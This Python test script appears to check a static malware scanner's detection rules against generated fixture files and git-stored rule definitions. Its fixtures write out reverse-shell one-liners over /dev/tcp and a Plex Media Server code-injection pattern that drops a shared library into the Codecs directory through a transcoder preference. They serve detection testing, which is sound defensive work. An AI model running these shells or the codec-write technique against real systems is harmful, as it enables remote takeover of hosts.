"""Static controls: never execute exploit traffic or compiled payloads.

Usage: python3 check.py <scratch-output-directory>
"""
from pathlib import Path
import json, subprocess, sys, yaml
ROOT = Path(__file__).resolve().parents[3]
OUT = Path(sys.argv[1]).resolve()
OUT.mkdir(parents=True, exist_ok=True)
M = json.loads((Path(__file__).parent/'moves.json').read_text())
RETURN = 'micro-behaviors/metaprogramming/generation::python-returned-shell-command-text'
TCP = 'objectives/command-and-control/reverse-shell/dev-tcp::python-builds-tcp-stdio-shell-command'
CODEC = 'objectives/execution/exploit/code-injection::python-formatted-codec-directory-dump'
DIRECT = 'objectives/execution/exploit/code-injection::plex-transcoder-codec-library-write'
cases=[]
def add(name, source, yes=(), no=()):
    p=OUT/name;p.write_text(source);cases.append((p,set(yes),set(no)))
# Existing external-to-batch attack fixtures must retain their original detections.
for name in ['bash-generator.py','bash-renamed.py','pty-with-unrelated-ip-helper.py']:
    cases.append((ROOT/'testdata/triage/koi-offensive-toolkit'/name,{RETURN},set()))
add('dispatch-lport.py','def build(target_os, lport):\n    return choose_payload(target_os, lport)\n',no=[RETURN,TCP])
add('parameter-return.py','def build(lhost):\n    return lhost\n',no=[RETURN,TCP])
add('returned-command.py','def build(host):\n    return "bash -i >& /dev/tcp/%s/9000 0>&1" % host\n',yes=[RETURN],no=[TCP])
cmd='def build(h,p):\n    return ("/usr/bin/bash -c \'exec 0<>/dev/tcp/%s/%d 1>&0 2>&0; "\n            "exec /usr/bin/script -qc /bin/bash /dev/null\'" % (h,p))\n'
add('tcp-shell.py',cmd,yes=[RETURN,TCP])
add('tcp-no-stdin.py',cmd.replace('0<>','3<>'),no=[TCP])
add('tcp-no-output.py',cmd.replace('1>&0 2>&0','1>/tmp/output 2>&1'),no=[TCP])
add('tcp-no-shell.py',cmd.replace('/bin/bash','/bin/cat'),no=[TCP])
dynamic='''def build(root, version, filename, base, token):
    directory = "%s/Codecs/%s" % (root, version)
    destination = "%s/%s" % (directory, filename)
    def deliver():
        request(base, "/:/prefs", {"TranscoderH264Options": "dump-yuv=%s:qp=0" % destination}, token, method="PUT")
    return deliver
'''
add('computed-codec.py',dynamic,yes=[CODEC])
add('computed-renamed.py',dynamic.replace('directory','cache_location').replace('destination','output_file').replace('request','http_send'),yes=[CODEC])
add('computed-unrelated.py',dynamic.replace('% destination','% other_destination'),no=[CODEC])
add('computed-other-dir.py',dynamic.replace('/Codecs/','/Frames/'),no=[CODEC])
add('computed-other-option.py',dynamic.replace('TranscoderH264Options','Description'),no=[CODEC])
base='settings = {"TranscoderH264Options": "dump-yuv=/srv/Plex Media Server/Codecs/abc-linux-x86_64/filter.so:qp=0"}\nroute="/video/:/transcode/universal/start.m3u8"\n'
add('direct-codec.py',base,yes=[DIRECT])
add('backup-codec.py',base.replace('.so:', '.so.bak:'),no=[DIRECT])
add('ordinary-video.py',base.replace('/srv/Plex Media Server/Codecs/abc-linux-x86_64/filter.so','/tmp/frame.yuv'),no=[DIRECT,CODEC])
add('neutral-observations.py','compiler="gcc"\nself.httpd = object()\ncommand="export TERM=xterm"\npath="/srv/Codecs/version/filter.so"\nopen(raw,"wb").write(frame)\n',yes=[M[x] for x in ['micro-behaviors/process/create/shell/build::python-gcc-command','micro-behaviors/os/service/daemon::httpd','micro-behaviors/communications/http/download/write::shell-env-export-fragment','micro-behaviors/fs/path/app-data::codecs-directory-reference','micro-behaviors/data/manipulation::python-open-write-call']],no=M)
add('powershell-urlencode.ps1',"$value = [uri]::EscapeDataString($url)\n",yes=['micro-behaviors/data/encode/url::powershell-uri-escape-data-string-call'])
add('powershell-other-escape.ps1',"$value = [Other]::EscapeDataString($url)\n",no=['micro-behaviors/data/encode/url::powershell-uri-escape-data-string-call'])
add('powershell-token.ps1',"$headers = @{'X-Plex-Token'='token'}\n",yes=['micro-behaviors/communications/http/token-auth::custom-token-header'])
add('javascript-token.js',"const headers = {'X-Example-Token':'token'};\n",yes=['micro-behaviors/communications/http/token-auth::custom-token-header'])
add('attack-class-words.py',"description='SSRF and RCE'\n",yes=['metadata/lang/source/naming/target::ssrf-acronym','metadata/lang/source/naming/target::server-attack-class-acronyms'],no=['micro-behaviors/data/parse/vocabulary::ssrf-acronym','micro-behaviors/data/parse/vocabulary::server-attack-class-acronyms'])
add('unrelated-description.py',"description='Media timeline codec'\n",no=['metadata/lang/source/naming/target::ssrf-acronym','metadata/lang/source/naming/target::server-attack-class-acronyms'])
add('header-comparison.py',"value = 'X-Example-Token' == supplied\n",no=['micro-behaviors/communications/http/token-auth::custom-token-header'])
add('multiline-raw-command.py','def build(host):\n    return (\n        RF"bash -i >& /dev/tcp/{host}/9000 0>&1"\n    )\n',yes=[RETURN])
# Compare effective predicates and filters against the repository's original
# rules, so placement repairs cannot accidentally erase positive variants.
cache={}
def old_rule(id):
    directory, local=id.split('::')
    for file in subprocess.check_output(['git','ls-tree','-r','--name-only','HEAD',directory],cwd=ROOT,text=True).splitlines():
        if not file.endswith('.yaml'):continue
        if file not in cache:cache[file]=yaml.safe_load(subprocess.check_output(['git','show','HEAD:'+file],cwd=ROOT,text=True)) or {}
        d=cache[file]
        for k in ['traits','composite_rules']:
            for t in d.get(k) or []:
                if t.get('id')==local:return {**(d.get('defaults') or {}),**t}
    raise AssertionError(id)
def new_rule(id):
    directory, local=id.split('::')
    for p in (ROOT/directory).glob('*.yaml'):
        d=yaml.safe_load(p.read_text()) or {}
        for k in ['traits','composite_rules']:
            for t in d.get(k) or []:
                if t.get('id')==local:return {**(d.get('defaults') or {}),**t}
    raise AssertionError(id)
for old,new in M.items():
    a,b=old_rule(old),new_rule(new)
    for key in ['if','unless','not','downgrade','for','platforms','crit','conf','size_min','size_max']:
        assert a.get(key)==b.get(key),(old,key,a.get(key),b.get(key))
print('Preserved effective matchers/scopes/criticality:',len(M))
r=subprocess.run(['cleave','--traits-dir',str(ROOT),'--json',*[str(p) for p,_,_ in cases]],capture_output=True,text=True,check=True)
(OUT/'scans.jsonl').write_text(r.stdout);(OUT/'scans.log').write_text(r.stderr)
observed={f['path']:{t['id'] for t in f.get('traits',[])} for line in r.stdout.splitlines() for f in json.loads(line)['files']}
for p,yes,no in cases:
    ids=observed[str(p)];assert yes<=ids,('missing',p.name,yes-ids);assert not no&ids,('unexpected',p.name,no&ids)
print('PASS:',len(cases),'cases;',sum(len(y)+len(n) for _,y,n in cases),'assertions')
